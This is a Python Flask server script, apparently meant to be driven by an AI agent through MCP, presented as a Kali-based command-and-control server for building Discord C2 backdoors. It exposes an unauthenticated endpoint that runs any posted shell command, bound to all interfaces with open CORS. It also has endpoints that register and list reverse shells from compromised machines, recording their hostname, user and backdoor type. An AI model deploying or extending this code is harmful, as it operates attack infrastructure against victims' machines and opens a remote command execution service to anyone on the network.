#!/usr/bin/env python3
"""
MCP Kali Server for Hostinger VPS
Handles Discord C2 backdoor building and command execution
"""

from flask import Flask, request, jsonify
from flask_cors import CORS
import subprocess
import json
import os
import sys
from datetime import datetime

app = Flask(__name__)
CORS(app)

# Global variables
reverse_shells = {}
command_history = []

@app.route('/health', methods=['GET'])
def health_check():
    """Health check endpoint"""
    return jsonify({
        "status": "healthy",
        "timestamp": datetime.now().isoformat(),
        "server": "MCP Kali Server",
        "version": "1.0"
    })

@app.route('/api/command', methods=['POST'])
def execute_command():
    """Execute shell commands on Kali server"""
    try:
        data = request.get_json()
        if not data or 'command' not in data:
            return jsonify({"success": False, "error": "No command provided"}), 400
        
        command = data['command']
        print(f"[{datetime.now()}] Executing: {command[:100]}...")
        
        # Log command
        command_history.append({
            "command": command,
            "timestamp": datetime.now().isoformat()
        })
        
        # Execute command
        result = subprocess.run(
            command,
            shell=True,
            capture_output=True,
            text=True,
            timeout=300  # 5 minute timeout
        )
        
        response = {
            "success": True,
            "stdout": result.stdout,
            "stderr": result.stderr,
            "returncode": result.returncode
        }
        
        print(f"[{datetime.now()}] Command completed with code: {result.returncode}")
        
        return jsonify(response)
        
    except subprocess.TimeoutExpired:
        return jsonify({
            "success": False,
            "error": "Command timeout - took longer than 5 minutes"
        }), 408
    except Exception as e:
        print(f"[{datetime.now()}] Error executing command: {str(e)}")
        return jsonify({
            "success": False,
            "error": str(e)
        }), 500

@app.route('/reverse-shell/register', methods=['POST'])
def register_reverse_shell():
    """Register a new reverse shell connection"""
    try:
        data = request.get_json()
        client_id = data.get('client_id', 'unknown')
        
        reverse_shells[client_id] = {
            "hostname": data.get('hostname', 'Unknown'),
            "user": data.get('user', 'Unknown'),
            "os": data.get('os', 'Unknown'),
            "backdoor_type": data.get('backdoor_type', 'Unknown'),
            "registered_at": datetime.now().isoformat(),
            "last_seen": datetime.now().isoformat(),
            "status": "connected"
        }
        
        print(f"[{datetime.now()}] New reverse shell registered: {client_id}")
        print(f"  - Host: {reverse_shells[client_id]['hostname']}")
        print(f"  - User: {reverse_shells[client_id]['user']}")
        print(f"  - Type: {reverse_shells[client_id]['backdoor_type']}")
        
        return jsonify({"success": True, "message": "Registered successfully"})
        
    except Exception as e:
        print(f"[{datetime.now()}] Error registering reverse shell: {str(e)}")
        return jsonify({"success": False, "error": str(e)}), 500

@app.route('/reverse-shells', methods=['GET'])
def list_reverse_shells():
    """List all registered reverse shells"""
    return jsonify({
        "success": True,
        "shells": reverse_shells,
        "count": len(reverse_shells)
    })

if __name__ == '__main__':
    print("🚀 Starting MCP Kali Server...")
    print("📋 Server Features:")
    print("  - Discord C2 backdoor building")
    print("  - Command execution")
    print("  - Reverse shell management")
    print("  - Web interface support")
    print("")
    print("🌐 Server will be available at:")
    print("  - Local: http://localhost:5000")
    print("  - Network: http://0.0.0.0:5000")
    print("")
    
    # Create necessary directories
    os.makedirs('/root/c2builds', exist_ok=True)
    os.makedirs('/root/output', exist_ok=True)
    
    print("📁 Created directories:")
    print("  - /root/c2builds (for building)")
    print("  - /root/output (for executables)")
    print("")
    
    app.run(host='0.0.0.0', port=5000, debug=False)